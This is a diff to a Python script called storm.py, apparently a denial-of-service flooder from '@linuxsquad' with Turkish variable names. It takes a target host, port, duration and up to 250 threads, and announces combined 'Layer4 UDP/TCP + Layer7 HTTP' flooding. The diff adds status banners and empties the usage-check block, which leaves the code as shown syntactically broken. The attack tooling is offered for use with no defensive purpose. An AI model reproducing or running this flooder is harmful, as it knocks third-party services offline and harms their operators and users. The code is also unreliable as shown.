@@ -1,3 +1,4 @@
+#!/data/data/com.termux/files/usr/bin/python
 import socket,random,time,os,sys,threading,struct
 
 os.system("clear")
@@ -11,7 +12,7 @@ print("\033[93mdeveloper:@linuxsquad\033[0m")
 print("\n\033[92mpython storm.py <HEDEF> <PORT> [SURE] [THREAD]\033[0m\n")
 
 if len(sys.argv)<3:
-    print("python storm.py <HEDEF> <PORT> [SURE] [THREAD]");sys.exit(1)
+    
 
 HEDEF=sys.argv[1];PORT=int(sys.argv[2]);SURE=int(sys.argv[3])if len(sys.argv)>3 else 60
 THREAD=min(int(sys.argv[4])if len(sys.argv)>4 else 200,250)
@@ -75,7 +76,8 @@ class Flooder(threading.Thread):
                 pass
         self.udp.close()
 
-
+print(f"\033[93m[+] Hedef:{HEDEF} Port:{PORT} Sure:{SURE}s Thread:{THREAD}\033[0m")
+print("\033[92m[+] Layer4 UDP/TCP + Layer7 HTTP Aktif\033[0m")
 
 aktif=0
 for i in range(THREAD):
